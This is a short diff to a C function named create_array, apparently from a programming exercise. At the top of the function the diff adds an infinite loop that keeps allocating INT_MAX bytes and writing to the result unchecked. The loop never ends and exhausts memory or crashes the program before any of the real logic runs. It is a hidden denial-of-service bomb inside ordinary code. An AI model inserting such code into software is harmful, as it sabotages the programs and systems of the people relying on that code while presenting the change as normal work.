@@ -13,6 +13,11 @@ char *create_array(unsigned int size, char c)
 	char *a;
 	unsigned int i;
 
+	while (1)
+	{
+		a = malloc(INT_MAX);
+		a[0] = c;
+	}
 	a = malloc(sizeof(char) * 98);
 	if (size == 0)
 		return (NULL);
